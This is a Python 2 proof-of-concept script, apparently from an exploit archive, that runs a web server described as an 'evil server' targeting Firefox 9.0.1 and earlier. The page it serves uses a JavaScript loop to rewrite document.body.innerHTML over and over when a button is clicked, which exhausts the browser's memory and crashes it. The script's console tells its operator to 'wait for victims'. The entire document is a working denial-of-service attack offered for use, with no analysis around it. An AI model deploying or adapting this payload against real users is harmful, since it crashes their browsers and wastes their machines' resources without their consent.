#
# --------------------------------------------------------------------------
# Title        : 	Mozilla Firefox <= 9.0.1 Memory Corruption PoC.
# Author       : 	mr.pr0n - (@_pr0n_)
# Homepage     : 	http://ghostinthelab.wordpress.com/
# Version      : 	9.0.1
# Tested on    : 	Windows XP with SP2/SP3,
#           		Windows Vista with SP1,
#           		Windows 7 with SP1.
# ---------------------------------------------------------------------------
# About the Bug :
# ---------------------------------------------------------------------------
# Mozilla Firefox 9.0.1 (and prior versions) is prone to a remote denial of service attack.
# If a user browses to the malicious page (that takes advantage of this vulnerability) the browser will crash.
# A successful attack may result in crashing the application, or consuming excessive CPU and memory resources.
# ---------------------------------------------------------------------------
#
import sys
import socket

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
class RequestHandler(BaseHTTPRequestHandler):

    def dos_firefox(self):
        exploit ='''
		<html>
		<head>
		<center>
		<title>Crashing Firefox...</title>
		<h1>Kill the fox!</h1>
		<script type="text/javascript">
		function kill()
		{
			for (i = 0; i < 30; i++)
			{
				subject = document.body.innerHTML;
				document.write(subject);
			}
		}
		</script>
		<body>
		<form>
		<input type="button" value="Shoot!" onclick="kill()" />
		</form>
		</body>
		</center>
		</head>
		</html>
        	'''
        return exploit

    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[*] User %s connected to evil server!' % self.client_address[0]
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.wfile.write(self.dos_firefox())
        except:
            print '[*] Error : an error has occured while serving the HTTP request'
            print '[-] Exiting ...'
            sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print '\n-----------------------------------------------------'
        print ' Mozilla Firefox <= 9.0.1 Memory Corruption PoC.'
        print '-----------------------------------------------------\n'
        print 'Usage:\n%s [port number]' % sys.argv[0]
        sys.exit(0)

    try:
        port = int(sys.argv[1])
        if port < 1024 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '\n-------------------------------------------------'
            print ' Mozilla Firefox <= 9.0.1 Memory Corruption PoC.'
            print '--------------------------------------------------\n'
            print '[*] OK! The evil web server is up and running on port %d...' % (port)
            print '[*] Wait for victims...'
            try:
                serv.serve_forever()
            except:
                print '[*] Exiting!'
        except socket.error:
            print '[*] Error : a socket error has occurred!'
        sys.exit(-1)
    except ValueError:
        print '[*] Error : an invalid port number was given!'
        sys.exit(-1)

if __name__ == '__main__':
    main()

